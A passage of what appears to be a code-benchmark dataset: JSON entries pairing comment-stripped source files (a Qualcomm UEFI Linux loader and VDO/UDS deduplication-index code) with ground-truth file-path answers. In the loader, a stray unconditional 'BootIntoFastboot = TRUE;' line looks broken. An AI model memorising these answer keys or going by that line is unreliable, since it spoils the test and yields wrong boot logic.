(0xFFF))));\n  DEBUG ((EFI_D_VERBOSE, \"LinuxLoaderEntry Address: 0x%llx\\n\",\n         (UINTN)LinuxLoaderEntry));\n\n  Status = InitThreadUnsafeStack ();\n\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Unable to Allocate memory for Unsafe Stack: %r\\n\",\n            Status));\n    goto stack_guard_update_default;\n  }\n\n  StackGuardChkSetup ();\n\n  BootStatsSetTimeStamp (BS_BL_START);\n\n\n  Status = DeviceInfoInit ();\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Initialize the device info failed: %r\\n\", Status));\n    goto stack_guard_update_default;\n  }\n\n  Status = EnumeratePartitions ();\n\n  if (EFI_ERROR (Status)) {\n    DEBUG ((EFI_D_ERROR, \"LinuxLoader: Could not enumerate partitions: %r\\n\",\n            Status));\n    goto stack_guard_update_default;\n  }\n\n  UpdatePartitionEntries ();\n\n  MultiSlotBoot = PartitionHasMultiSlot ((CONST CHAR16 *)L\"boot\");\n  if (MultiSlotBoot) {\n    DEBUG ((EFI_D_VERBOSE, \"Multi Slot boot is supported\\n\"));\n    FindPtnActiveSlot ();\n  }\n\n\n\n\n      BootIntoFastboot = TRUE;\n\n\n\n\n\n\n\n\n\n\n  Status = GetRebootReason (&BootReason);\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Failed to get Reboot reason: %r\\n\", Status));\n    goto stack_guard_update_default;\n  }\n\n  switch (BootReason) {\n  case FASTBOOT_MODE:\n    BootIntoFastboot = TRUE;\n    break;\n  case RECOVERY_MODE:\n    BootIntoRecovery = TRUE;\n    break;\n  case ALARM_BOOT:\n    BootReasonAlarm = TRUE;\n    break;\n  case DM_VERITY_ENFORCING:\n\n    Status = EnableEnforcingMode (TRUE);\n    if (Status != EFI_SUCCESS)\n      goto stack_guard_update_default;\n    break;\n  case DM_VERITY_LOGGING:\n\n    Status = MdtpDisable ();\n    if (EFI_ERROR (Status) && Status != EFI_NOT_FOUND) {\n      DEBUG ((EFI_D_ERROR, \"MdtpDisable Returned error: %r\\n\", Status));\n      goto stack_guard_update_default;\n    }\n\n    Status = EnableEnforcingMode (FALSE);\n    if (Status != EFI_SUCCESS)\n      goto stack_guard_update_default;\n\n    break;\n  case DM_VERITY_KEYSCLEAR:\n    Status = ResetDeviceState ();\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR, \"VB Reset Device State error: %r\\n\", Status));\n      goto stack_guard_update_default;\n    }\n    break;\n  default:\n    if (BootReason != NORMAL_MODE) {\n      DEBUG ((EFI_D_ERROR,\n             \"Boot reason: 0x%x not handled, defaulting to Normal Boot\\n\",\n             BootReason));\n    }\n    break;\n  }\n\n  Status = RecoveryInit (&BootIntoRecovery);\n  if (Status != EFI_SUCCESS)\n    DEBUG ((EFI_D_VERBOSE, \"RecoveryInit failed ignore: %r\\n\", Status));\n\n\n  Status = BoardInit ();\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Error finding board information: %r\\n\", Status));\n    return Status;\n  }\n\n  DEBUG ((EFI_D_INFO, \"KeyPress:%u, BootReason:%u\\n\", KeyPressed, BootReason));\n  DEBUG ((EFI_D_INFO, \"Fastboot=%d, Recovery:%d\\n\",\n                                          BootIntoFastboot, BootIntoRecovery));\n  if (!GetVmData ()) {\n    DEBUG ((EFI_D_ERROR, \"VM Hyp calls not present\\n\"));\n  }\n\n  if (!BootIntoFastboot) {\n    BootInfo Info = {0};\n    Info.MultiSlotBoot = MultiSlotBoot;\n    Info.BootIntoRecovery = BootIntoRecovery;\n    Info.BootReasonAlarm = BootReasonAlarm;\n    Status = LoadImageAndAuth (&Info);\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR, \"LoadImageAndAuth failed: %r\\n\", Status));\n      goto fastboot;\n    }\n\n    Status = WaitForDisplayCompletion ();\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR, \"Failed to wait for display completion: %r\\n\",\n                  Status));\n    }\n    BootLinux (&Info);\n  }\n\nfastboot:\n  Status = WaitForDisplayCompletion ();\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Failed to wait for display completion: %r\\n\",\n                Status));\n  }\n\n  DEBUG ((EFI_D_INFO, \"Launching fastboot\\n\"));\n  Status = FastbootInitialize ();\n  if (EFI_ERROR (Status)) {\n    DEBUG ((EFI_D_ERROR, \"Failed to Launch Fastboot App: %d\\n\", Status));\n    goto stack_guard_update_default;\n  }\n\nstack_guard_update_default:\n\n  __stack_chk_guard = DEFAULT_STACK_CHK_GUARD;\n\n  return Status;\n}\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/fdtcompat.h'\n:#ifndef FDT_COMPAT_H\n#define FDT_COMPAT_H\n\nstruct fdt_entry_node {\n        fdt64_t address;\n        fdt64_t size;\n        struct fdt_entry_node *next;\n};\n\n#endif\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'\n:\n\n#ifndef __BOOTLINUXLIB_H__\n#define __BOOTLINUXLIB_H__\n\n#include <Uefi.h>\n\n#include <Guid/FileInfo.h>\n#include <Guid/FileSystemInfo.h>\n#include <Guid/Gpt.h>\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/CacheMaintenanceLib.h>\n#include <Library/DebugLib.h>\n#include <Library/DevicePathLib.h>\n#include <Library/DrawUI.h>\n#include <Library/IoLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PcdLib.h>\n#include <Library/PrintLib.h>\n#include <Library/TimerLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n#include <PiDxe.h>\n#include <Protocol/BlockIo.h>\n#include <Protocol/DevicePath.h>\n#include <Protocol/EFIVerifiedBoot.h>\n#include <Protocol/FirmwareVolume2.h>\n#include <Protocol/LoadedImage.h>\n#include <Protocol/SerialIo.h>\n#include <Protocol/SimpleFileSystem.h>\n#include <Protocol/EFISecRSA.h>\n#include <Protocol/Hash.h>\n#include <Protocol/Hash2.h>\n#include <Protocol/EFIASN1X509.h>\n\n#include \"Board.h\"\n#include \"BootImage.h\"\n#include \"Decompress.h\"\n#include \"DeviceInfo.h\"\n#include \"LinuxLoaderLib.h\"\n#include \"LocateDeviceTree.h\"\n#include \"PartitionTableUpdate.h\"\n#include \"Recovery.h\"\n#include \"ShutdownServices.h\"\n#include \"UpdateCmdLine.h\"\n#include \"UpdateDeviceTree.h\"\n#include \"VerifiedBoot.h\"\n\n#define ALIGN32_BELOW(addr) ALIGN_POINTER (addr - 32, 32)\n#define LOCAL_ROUND_TO_PAGE(x, y) (((x) + (y - 1)) & (~(y - 1)))\n#define ROUND_TO_PAGE(x, y) ((ADD_OF ((x), (y))) & (~(y)))\n#define ALIGN_PAGES(x, y) (((x) + (y - 1)) / (y))\n#define DECOMPRESS_SIZE_FACTOR 8\n#define ALIGNMENT_MASK_4KB 4096\n#define MAX_NUMBER_OF_LOADED_IMAGES 32\n\n#define PATCHED_KERNEL_HEADER_SIZE 20\n\n#define PATCHED_KERNEL_MAGIC \"UNCOMPRESSED_IMG\"\n\n\n#define DT_SIZE_2MB      (2 * 1024 * 1024)\n\n#define KERNEL_32BIT_LOAD_OFFSET 0x8000\n#define KERNEL_64BIT_LOAD_OFFSET 0x80000\n\ntypedef enum {\n  KERNEL_32BIT = 0,\n  KERNEL_64BIT\n} KernelMode;\n\ntypedef enum {\n LOAD_ADDR_NONE = 0,\n LOAD_ADDR_KERNEL,\n LOAD_ADDR_RAMDISK\n} AddrType;\n\ntypedef VOID (*LINUX_KERNEL) (UINT64 ParametersBase,\n                              UINT64 Reserved0,\n                              UINT64 Reserved1,\n                              UINT64 Reserved2);\ntypedef VOID (*LINUX_KERNEL32) (UINT32 Zero, UINT32 Arch, UINTN ParametersBase);\n\ntypedef enum {\n        IMG_BOOT = 0,\n        IMG_DTBO,\n        IMG_VBMETA,\n        IMG_RECOVERY,\n        IMG_VENDOR_BOOT,\n        IMG_MAX\n} img_type;\n\ntypedef struct {\n  CHAR8 *Name;\n  VOID *ImageBuffer;\n  UINTN ImageSize;\n} ImageData;\n\ntypedef struct BootInfo {\n  BOOLEAN MultiSlotBoot;\n  BOOLEAN BootIntoRecovery;\n  BOOLEAN BootReasonAlarm;\n  CHAR16 Pname[MAX_GPT_NAME_SIZE];\n  CHAR16 BootableSlot[MAX_GPT_NAME_SIZE];\n  ImageData Images[MAX_NUMBER_OF_LOADED_IMAGES];\n  UINTN NumLoadedImages;\n  QCOM_VERIFIEDBOOT_PROTOCOL *VbIntf;\n  boot_state_t BootState;\n  CHAR8 *VBCmdLine;\n  UINT32 VBCmdLineLen;\n  UINT32 VBCmdLineFilledLen;\n  VOID *VBData;\n  UINT32 HeaderVersion;\n} BootInfo;\n\ntypedef struct BootLinuxParamlist {\n\n  UINT64 BaseMemory;\n\n  VOID *ImageBuffer;\n  UINT64 ImageSize;\n  VOID *DtboImgBuffer;\n\n\n  VOID *VendorImageBuffer;\n  UINT64 VendorImageSize;\n\n\n  UINT64 KernelLoadAddr;\n  UINT64 KernelEndAddr;\n  UINT64 RamdiskLoadAddr;\n  UINT64 DeviceTreeLoadAddr;\n  UINT64 *HypDtboBaseAddr;\n  UINT32 NumHypDtbos;\n\n\n  UINT32 PageSize;\n  UINT32 KernelSize;\n  UINT32 SecondSize;\n  UINT32 RamdiskSize;\n  UINT32 RamdiskOffset;\n  UINT32 PatchedKernelHdrSize;\n  UINT32 DtbOffset;\n\n\n\n  UINT32 VendorRamdiskSize;\n\n\n  UINT32 KernelSizeActual;\n\n  CHAR8 *FinalCmdLine;\n  CHAR8 *CmdLine;\n  BOOLEAN BootingWith32BitKernel;\n  BOOLEAN BootingWithPatchedKernel;\n  BOOLEAN BootingWithGzipPkgKernel;\n} BootParamlist;\n\nEFI_STATUS\nBootLinux (BootInfo *Info);\nEFI_STATUS\nCheckImageHeader (VOID *ImageHdrBuffer,\n                  UINT32 ImageHdrSize,\n                  VOID *VendorImageHdrBuffer,\n                  UINT32 VendorImageHdrSize,\n                  UINT32 *ImageSizeActual,\n                  UINT32 *PageSize,\n                  BOOLEAN BootIntoRecovery);\nEFI_STATUS\nLoadImageHeader (CHAR16 *Pname, VOID **ImageHdrBuffer, UINT32 *ImageHdrSize);\nEFI_STATUS\nLoadImage (CHAR16 *Pname, VOID **ImageBuffer,\n           UINT32 ImageSizeActual, UINT32 PageSize);\n\n\nBOOLEAN TargetBuildVariantUser (VOID);\nBOOLEAN IsLEVariant (VOID);\nBOOLEAN IsBuildAsSystemRootImage (VOID);\nBOOLEAN IsBuildUseRecoveryAsBoot (VOID);\nEFI_STATUS\nGetImage (CONST BootInfo *Info,\n          VOID **ImageBuffer,\n          UINTN *ImageSize,\n          CHAR8 *ImageName);\nBOOLEAN\nLoadAndValidateDtboImg (BootInfo *Info,\n                        BootParamlist *BootParamlistPtr);\nVOID SetBootDevImage (VOID);\nVOID ResetBootDevImage (VOID);\nBOOLEAN IsBootDevImage (VOID);\nBOOLEAN IsABRetryCountDisabled (VOID);\nBOOLEAN IsDynamicPartitionSupport (VOID);\nBOOLEAN IsVirtualAbOtaSupported (VOID);\nUINT64 SetandGetLoadAddr (BootParamlist *BootParamlistPtr, AddrType Type);\nBOOLEAN IsNANDSquashFsSupport (VOID);\nBOOLEAN IsEnableDisplayMenuFlagSupported (VOID);\nBOOLEAN IsSystemdBootslotEnabled (VOID);\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/fdtcompat.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/LocateDeviceTree.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Application/LinuxLoader/LinuxLoader.c'"
        ]
    },
    {
        "files": [
            "'vdo/utils/uds/open-chapter.c'",
            "'vdo/utils/uds/open-chapter.h'",
            "'vdo/utils/uds/volume.h'",
            "'vdo/utils/uds/geometry.h'"
        ],
        "content": "'vdo/utils/uds/open-chapter.c'\n:\n\n\n#include \"open-chapter.h\"\n\n#include <linux/log2.h>\n\n#include \"logger.h\"\n#include \"memory-alloc.h\"\n#include \"numeric.h\"\n#include \"permassert.h\"\n\n#include \"config.h\"\n#include \"hash-utils.h\"\n\n\n\nstatic const u8 OPEN_CHAPTER_MAGIC[] = \"ALBOC\";\nstatic const u8 OPEN_CHAPTER_VERSION[] = \"02.00\";\n\n#define OPEN_CHAPTER_MAGIC_LENGTH (sizeof(OPEN_CHAPTER_MAGIC) - 1)\n#define OPEN_CHAPTER_VERSION_LENGTH (sizeof(OPEN_CHAPTER_VERSION) - 1)\n#define LOAD_RATIO 2\n\nstatic inline size_t records_size(const struct open_chapter_zone *open_chapter)\n{\n\treturn sizeof(struct uds_volume_record) * (1 + open_chapter->capacity);\n}\n\nstatic inline size_t slots_size(size_t slot_count)\n{\n\treturn sizeof(struct open_chapter_zone_slot) * slot_count;\n}\n\nint uds_make_open_chapter(const struct index_geometry *geometry, unsigned int zone_count,\n\t\t\t  struct open_chapter_zone **open_chapter_ptr)\n{\n\tint result;\n\tstruct open_chapter_zone *open_chapter;\n\tsize_t capacity = geometry->records_per_chapter / zone_count;\n\tsize_t slot_count = (1 << bits_per(capacity * LOAD_RATIO));\n\n\tresult = vdo_allocate_extended(struct open_chapter_zone, slot_count,\n\t\t\t\t       struct open_chapter_zone_slot, \"open chapter\",\n\t\t\t\t       &open_chapter);\n\tif (result != VDO_SUCCESS)\n\t\treturn result;\n\n\topen_chapter->slot_count = slot_count;\n\topen_chapter->capacity = capacity;\n\tresult = vdo_allocate_cache_aligned(records_size(open_chapter), \"record pages\",\n\t\t\t\t\t    &open_chapter->records);\n\tif (result != VDO_SUCCESS) {\n\t\tuds_free_open_chapter(open_chapter);\n\t\treturn result;\n\t}\n\n\t*open_chapter_ptr = open_chapter;\n\treturn UDS_SUCCESS;\n}\n\nvoid uds_reset_open_chapter(struct open_chapter_zone *open_chapter)\n{\n\topen_chapter->size = 0;\n\topen_chapter->deletions = 0;\n\n\tmemset(open_chapter->records, 0, records_size(open_chapter));\n\tmemset(open_chapter->slots, 0, slots_size(open_chapter->slot_count));\n}\n\nstatic unsigned int probe_chapter_slots(struct open_chapter_zone *open_chapter,\n\t\t\t\t\tconst struct uds_record_name *name)\n{\n\tstruct uds_volume_record *record;\n\tunsigned int slot_count = open_chapter->slot_count;\n\tunsigned int slot = uds_name_to_hash_slot(name, slot_count);\n\tunsigned int record_number;\n\tunsigned int attempts = 1;\n\n\twhile (true) {\n\t\trecord_number = open_chapter->slots[slot].record_number;\n\n\n\t\tif (record_number == 0)\n\t\t\treturn slot;\n\n\n\t\trecord = &open_chapter->records[record_number];\n\t\tif ((memcmp(&record->name, name, UDS_RECORD_NAME_SIZE) == 0) &&\n\t\t    !open_chapter->slots[record_number].deleted)\n\t\t\treturn slot;\n\n\n\t\tslot = (slot + attempts++) % slot_count;\n\t}\n}\n\nvoid uds_search_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t     const struct uds_record_name *name,\n\t\t\t     struct uds_record_data *metadata, bool *found)\n{\n\tunsigned int slot;\n\tunsigned int record_number;\n\n\tslot = probe_chapter_slots(open_chapter, name);\n\trecord_number = open_chapter->slots[slot].record_number;\n\tif (record_number == 0) {\n\t\t*found = false;\n\t} else {\n\t\t*found = true;\n\t\t*metadata = open_chapter->records[record_number].data;\n\t}\n}\n\n\nint uds_put_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t const struct uds_record_name *name,\n\t\t\t const struct uds_record_data *metadata)\n{\n\tunsigned int slot;\n\tunsigned int record_number;\n\tstruct uds_volume_record *record;\n\n\tif (open_chapter->size >= open_chapter->capacity)\n\t\treturn 0;\n\n\tslot = probe_chapter_slots(open_chapter, name);\n\trecord_number = open_chapter->slots[slot].record_number;\n\n\tif (record_number == 0) {\n\t\trecord_number = ++open_chapter->size;\n\t\topen_chapter->slots[slot].record_number = record_number;\n\t}\n\n\trecord = &open_chapter->records[record_number];\n\trecord->name = *name;\n\trecord->data = *metadata;\n\n\treturn open_chapter->capacity - open_chapter->size;\n}\n\nvoid uds_remove_from_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t\t  const struct uds_record_name *name)\n{\n\tunsigned int slot;\n\tunsigned int record_number;\n\n\tslot = probe_chapter_slots(open_chapter, name);\n\trecord_number = open_chapter->slots[slot].record_number;\n\n\tif (record_number > 0) {\n\t\topen_chapter->slots[record_number].deleted = true;\n\t\topen_chapter->deletions += 1;\n\t}\n}\n\nvoid uds_free_open_chapter(struct open_chapter_zone *open_chapter)\n{\n\tif (open_chapter != NULL) {\n\t\tvdo_free(open_chapter->records);\n\t\tvdo_free(open_chapter);\n\t}\n}\n\n\nstatic int fill_delta_chapter_index(struct open_chapter_zone **chapter_zones,\n\t\t\t\t    unsigned int zone_count,\n\t\t\t\t    struct open_chapter_index *index,\n\t\t\t\t    struct uds_volume_record *collated_records)\n{\n\tint result;\n\tunsigned int records_per_chapter;\n\tunsigned int records_per_page;\n\tunsigned int record_index;\n\tunsigned int records = 0;\n\tu32 page_number;\n\tunsigned int z;\n\tint overflow_count = 0;\n\tstruct uds_volume_record *fill_record = NULL;\n\n\n\tfor (z = 0; z < zone_count; z++) {\n\t\tstruct open_chapter_zone *zone = chapter_zones[z];\n\n\t\tif (zone->size == zone->capacity) {\n\t\t\tfill_record = &zone->records[zone->size];\n\t\t\tbreak;\n\t\t}\n\t}\n\n\trecords_per_chapter = index->geometry->records_per_chapter;\n\trecords_per_page = index->geometry->records_per_page;\n\n\tfor (records = 0; records < records_per_chapter; records++) {\n\t\tstruct uds_volume_record *record = &collated_records[records];\n\t\tstruct open_chapter_zone *open_chapter;\n\n\n\t\trecord_index = 1 + (records / zone_count);\n\t\tpage_number = records / records_per_page;\n\t\topen_chapter = chapter_zones[records % zone_count];\n\n\n\t\tif (record_index > open_chapter->size ||\n\t\t    open_chapter->slots[record_index].deleted) {\n\t\t\t*record = *fill_record;\n\t\t\tcontinue;\n\t\t}\n\n\t\t*record = open_chapter->records[record_index];\n\t\tresult = uds_put_open_chapter_index_record(index, &record->name,\n\t\t\t\t\t\t\t   page_number);\n\t\tswitch (result) {\n\t\tcase UDS_SUCCESS:\n\t\t\tbreak;\n\t\tcase UDS_OVERFLOW:\n\t\t\toverflow_count++;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tvdo_log_error_strerror(result,\n\t\t\t\t\t       \"failed to build open chapter index\");\n\t\t\treturn result;\n\t\t}\n\t}\n\n\tif (overflow_count > 0)\n\t\tvdo_log_warning(\"Failed to add %d entries to chapter index\",\n\t\t\t\toverflow_count);\n\n\treturn UDS_SUCCESS;\n}\n\nint uds_close_open_chapter(struct open_chapter_zone **chapter_zones,\n\t\t\t   unsigned int zone_count, struct volume *volume,\n\t\t\t   struct open_chapter_index *chapter_index,\n\t\t\t   struct uds_volume_record *collated_records,\n\t\t\t   u64 virtual_chapter_number)\n{\n\tint result;\n\n\tuds_empty_open_chapter_index(chapter_index, virtual_chapter_number);\n\tresult = fill_delta_chapter_index(chapter_zones, zone_count, chapter_index,\n\t\t\t\t\t  collated_records);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\treturn uds_write_chapter(volume, chapter_index, collated_records);\n}\n\nint uds_save_open_chapter(struct uds_index *index, struct buffered_writer *writer)\n{\n\tint result;\n\tstruct open_chapter_zone *open_chapter;\n\tstruct uds_volume_record *record;\n\tu8 record_count_data[sizeof(u32)];\n\tu32 record_count = 0;\n\tunsigned int record_index;\n\tunsigned int z;\n\n\tresult = uds_write_to_buffered_writer(writer, OPEN_CHAPTER_MAGIC,\n\t\t\t\t\t      OPEN_CHAPTER_MAGIC_LENGTH);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tresult = uds_write_to_buffered_writer(writer, OPEN_CHAPTER_VERSION,\n\t\t\t\t\t      OPEN_CHAPTER_VERSION_LENGTH);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tfor (z = 0; z < index->zone_count; z++) {\n\t\topen_chapter = index->zones[z]->open_chapter;\n\t\trecord_count += open_chapter->size - open_chapter->deletions;\n\t}\n\n\tput_unaligned_le32(record_count, record_count_data);\n\tresult = uds_write_to_buffered_writer(writer, record_count_data,\n\t\t\t\t\t      sizeof(record_count_data));\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\trecord_index = 1;\n\twhile (record_count > 0) {\n\t\tfor (z = 0; z < index->zone_count; z++) {\n\t\t\topen_chapter = index->zones[z]->open_chapter;\n\t\t\tif (record_index > open_chapter->size)\n\t\t\t\tcontinue;\n\n\t\t\tif (open_chapter->slots[record_index].deleted)\n\t\t\t\tcontinue;\n\n\t\t\trecord = &open_chapter->records[record_index];\n\t\t\tresult = uds_write_to_buffered_writer(writer, (u8 *) record,\n\t\t\t\t\t\t\t      sizeof(*record));\n\t\t\tif (result != UDS_SUCCESS)\n\t\t\t\treturn result;\n\n\t\t\trecord_count--;\n\t\t}\n\n\t\trecord_index++;\n\t}\n\n\treturn uds_flush_buffered_writer(writer);\n}\n\nu64 uds_compute_saved_open_chapter_size(struct index_geometry *geometry)\n{\n\tunsigned int records_per_chapter = geometry->records_per_chapter;\n\n\treturn OPEN_CHAPTER_MAGIC_LENGTH + OPEN_CHAPTER_VERSION_LENGTH + sizeof(u32) +\n\t\trecords_per_chapter * sizeof(struct uds_volume_record);\n}\n\nstatic int load_version20(struct uds_index *index, struct buffered_reader *reader)\n{\n\tint result;\n\tu32 record_count;\n\tu8 record_count_data[sizeof(u32)];\n\tstruct uds_volume_record record;\n\n\n\tbool full_flags[MAX_ZONES] = {\n\t\tfalse,\n\t};\n\n\tresult = uds_read_from_buffered_reader(reader, (u8 *) &record_count_data,\n\t\t\t\t\t       sizeof(record_count_data));\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\trecord_count = get_unaligned_le32(record_count_data);\n\twhile (record_count-- > 0) {\n\t\tunsigned int zone = 0;\n\n\t\tresult = uds_read_from_buffered_reader(reader, (u8 *) &record,\n\t\t\t\t\t\t       sizeof(record));\n\t\tif (result != UDS_SUCCESS)\n\t\t\treturn result;\n\n\t\tif (index->zone_count > 1)\n\t\t\tzone = uds_get_volume_index_zone(index->volume_index,\n\t\t\t\t\t\t\t &record.name);\n\n\t\tif (!full_flags[zone]) {\n\t\t\tstruct open_chapter_zone *open_chapter;\n\t\t\tunsigned int remaining;\n\n\t\t\topen_chapter = index->zones[zone]->open_chapter;\n\t\t\tremaining = uds_put_open_chapter(open_chapter, &record.name,\n\t\t\t\t\t\t\t &record.data);\n\n\t\t\tfull_flags[zone] = (remaining <= 1);\n\t\t}\n\t}\n\n\treturn UDS_SUCCESS;\n}\n\nint uds_load_open_chapter(struct uds_index *index, struct buffered_reader *reader)\n{\n\tu8 version[OPEN_CHAPTER_VERSION_LENGTH];\n\tint result;\n\n\tresult = uds_verify_buffered_data(reader, OPEN_CHAPTER_MAGIC,\n\t\t\t\t\t  OPEN_CHAPTER_MAGIC_LENGTH);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tresult = uds_read_from_buffered_reader(reader, version, sizeof(version));\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tif (memcmp(OPEN_CHAPTER_VERSION, version, sizeof(version)) != 0) {\n\t\treturn vdo_log_error_strerror(UDS_CORRUPT_DATA,\n\t\t\t\t\t      \"Invalid open chapter version: %.*s\",\n\t\t\t\t\t      (int) sizeof(version), version);\n\t}\n\n\treturn load_version20(index, reader);\n}\n\n'vdo/utils/uds/open-chapter.h'\n:\n\n\n#ifndef UDS_OPEN_CHAPTER_H\n#define UDS_OPEN_CHAPTER_H\n\n#include \"chapter-index.h\"\n#include \"geometry.h\"\n#include \"index.h\"\n#include \"volume.h\"\n\n\n\nenum {\n\tOPEN_CHAPTER_RECORD_NUMBER_BITS = 23,\n};\n\nstruct open_chapter_zone_slot {\n\n\tunsigned int record_number : OPEN_CHAPTER_RECORD_NUMBER_BITS;\n\n\tbool deleted : 1;\n} __packed;\n\nstruct open_chapter_zone {\n\n\tunsigned int capacity;\n\n\tunsigned int size;\n\n\tunsigned int deletions;\n\n\tstruct uds_volume_record *records;\n\n\tunsigned int slot_count;\n\n\tstruct open_chapter_zone_slot slots[];\n};\n\nint __must_check uds_make_open_chapter(const struct index_geometry *geometry,\n\t\t\t\t       unsigned int zone_count,\n\t\t\t\t       struct open_chapter_zone **open_chapter_ptr);\n\nvoid uds_reset_open_chapter(struct open_chapter_zone *open_chapter);\n\nvoid uds_search_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t     const struct uds_record_name *name,\n\t\t\t     struct uds_record_data *metadata, bool *found);\n\nint __must_check uds_put_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t\t      const struct uds_record_name *name,\n\t\t\t\t      const struct uds_record_data *metadata);\n\nvoid uds_remove_from_open_chapter(struct open_chapter_zone *open_chapter,\n\t\t\t\t  const struct uds_record_name *name);\n\nvoid uds_free_open_chapter(struct open_chapter_zone *open_chapter);\n\nint __must_check uds_close_open_chapter(struct open_chapter_zone **chapter_zones,\n\t\t\t\t\tunsigned int zone_count, struct volume *volume,\n\t\t\t\t\tstruct open_chapter_index *chapter_index,\n\t\t\t\t\tstruct uds_volume_record *collated_records,\n\t\t\t\t\tu64 virtual_chapter_number);\n\nint __must_check uds_save_open_chapter(struct uds_index *index,\n\t\t\t\t       struct buffered_writer *writer);\n\nint __must_check uds_load_open_chapter(struct uds_index *index,\n\t\t\t\t       struct buffered_reader *reader);\n\nu64 uds_compute_saved_open_chapter_size(struct index_geometry *geometry);\n\n#endif\n\n'vdo/utils/uds/volume.h'\n:\n\n\n#ifndef UDS_VOLUME_H\n#define UDS_VOLUME_H\n\n#include <linux/atomic.h>\n#include <linux/cache.h>\n#include <linux/dm-bufio.h>\n#include <linux/limits.h>\n\n#include \"permassert.h\"\n#include \"thread-utils.h\"\n\n#include \"chapter-index.h\"\n#include \"config.h\"\n#include \"geometry.h\"\n#include \"indexer.h\"\n#include \"index-layout.h\"\n#include \"index-page-map.h\"\n#include \"radix-sort.h\"\n#include \"sparse-cache.h\"\n\n\n\nenum index_lookup_mode {\n\n\tLOOKUP_NORMAL,\n\n\tLOOKUP_FOR_REBUILD,\n};\n\nstruct queued_read {\n\tbool invalid;\n\tbool reserved;\n\tu32 physical_page;\n\tstruct uds_request *first_request;\n\tstruct uds_request *last_request;\n};\n\nstruct __aligned(L1_CACHE_BYTES) search_pending_counter {\n\tu64 atomic_value;\n};\n\nstruct cached_page {\n\n\tbool read_pending;\n\n\tu32 physical_page;\n\n\ts64 last_used;\n\n\tstruct dm_buffer *buffer;\n\n\tstruct delta_index_page index_page;\n};\n\nstruct page_cache {\n\n\tunsigned int zone_count;\n\n\tu32 indexable_pages;\n\n\tu16 cache_slots;\n\n\tu16 *index;\n\n\tstruct cached_page *cache;\n\n\tstruct search_pending_counter *search_pending_counters;\n\n\tstruct queued_read *read_queue;\n\n\n\n\n\tu16 read_queue_first;\n\tu16 read_queue_next_read;\n\tu16 read_queue_last;\n\n\tatomic64_t clock;\n};\n\nstruct volume {\n\tstruct index_geometry *geometry;\n\tstruct dm_bufio_client *client;\n\tu64 nonce;\n\tsize_t cache_size;\n\n\n\tconst struct uds_volume_record **record_pointers;\n\n\tstruct radix_sorter *radix_sorter;\n\n\tstruct sparse_cache *sparse_cache;\n\tstruct page_cache page_cache;\n\tstruct index_page_map *index_page_map;\n\n\tstruct mutex read_threads_mutex;\n\tstruct cond_var read_threads_cond;\n\tstruct cond_var read_threads_read_done_cond;\n\tstruct thread **reader_threads;\n\tunsigned int read_thread_count;\n\tbool read_threads_exiting;\n\n\tenum index_lookup_mode lookup_mode;\n\tunsigned int reserved_buffers;\n};\n\nint __must_check uds_make_volume(const struct uds_configuration *config,\n\t\t\t\t struct index_layout *layout,\n\t\t\t\t struct volume **new_volume);\n\nvoid uds_free_volume(struct volume *volume);\n\nint __must_check uds_replace_volume_storage(struct volume *volume,\n\t\t\t\t\t    struct index_layout *layout,\n\t\t\t\t\t    struct block_device *bdev);\n\nint __must_check uds_find_volume_chapter_boundaries(struct volume *volume,\n\t\t\t\t\t\t    u64 *lowest_vcn, u64 *highest_vcn,\n\t\t\t\t\t\t    bool *is_empty);\n\nint __must_check uds_search_volume_page_cache(struct volume *volume,\n\t\t\t\t\t      struct uds_request *request,\n\t\t\t\t\t      bool *found);\n\nint __must_check uds_search_volume_page_cache_for_rebuild(struct volume *volume,\n\t\t\t\t\t\t\t  const struct uds_record_name *name,\n\t\t\t\t\t\t\t  u64 virtual_chapter,\n\t\t\t\t\t\t\t  bool *found);\n\nint __must_check uds_search_cached_record_page(struct volume *volume,\n\t\t\t\t\t       struct uds_request *request, u32 chapter,\n\t\t\t\t\t       u16 record_page_number, bool *found);\n\nvoid uds_forget_chapter(struct volume *volume, u64 chapter);\n\nint __must_check uds_write_chapter(struct volume *volume,\n\t\t\t\t   struct open_chapter_index *chapter_index,\n\t\t\t\t   const struct uds_volume_record records[]);\n\nvoid uds_prefetch_volume_chapter(const struct volume *volume, u32 chapter);\n\nint __must_check uds_read_chapter_index_from_volume(const struct volume *volume,\n\t\t\t\t\t\t    u64 virtual_chapter,\n\t\t\t\t\t\t    struct dm_buffer *volume_buffers[],\n\t\t\t\t\t\t    struct delta_index_page index_pages[]);\n\nint __must_check 